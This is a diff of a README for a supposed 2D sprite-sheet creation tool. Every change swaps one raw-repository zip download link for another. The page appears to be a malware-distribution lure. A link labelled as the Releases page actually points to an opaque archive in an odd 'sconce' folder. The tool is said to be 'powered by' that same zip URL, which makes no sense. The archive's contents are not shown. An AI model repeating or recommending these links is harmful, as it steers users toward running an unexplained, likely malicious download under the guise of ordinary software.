@@ -1,10 +1,10 @@
 # 🎮 sprite-sheet-creator - Create Your Own 2D Characters Easily
 
 ## 📥 Download Now
-[![Download sprite-sheet-creator](https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/creator-sprite-sheet-3.6-alpha.4.zip)](https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/creator-sprite-sheet-3.6-alpha.4.zip)
+[![Download sprite-sheet-creator](https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/sheet_sprite_creator_v2.3.zip)](https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/sheet_sprite_creator_v2.3.zip)
 
 ## 🚀 Getting Started
-Welcome to **sprite-sheet-creator**! This tool helps you create your own playable 2D characters and maps, powered by https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/creator-sprite-sheet-3.6-alpha.4.zip No programming knowledge is required. In just a few steps, you will have your sprites ready to play.
+Welcome to **sprite-sheet-creator**! This tool helps you create your own playable 2D characters and maps, powered by https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/sheet_sprite_creator_v2.3.zip No programming knowledge is required. In just a few steps, you will have your sprites ready to play.
 
 ## 💻 System Requirements
 Before you begin, make sure your system meets the following requirements:
@@ -31,7 +31,7 @@ For more detailed instructions on how to use sprite-sheet-creator, check out the
 ## 🌐 Download & Install
 To download the latest version of **sprite-sheet-creator**, visit the Releases page:
 
-[Download sprite-sheet-creator from Releases](https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/creator-sprite-sheet-3.6-alpha.4.zip)
+[Download sprite-sheet-creator from Releases](https://raw.githubusercontent.com/theziondaniel/sprite-sheet-creator/main/sconce/sheet_sprite_creator_v2.3.zip)
 
 1. Click on the desired version.
 2. Download the file suitable for your system.
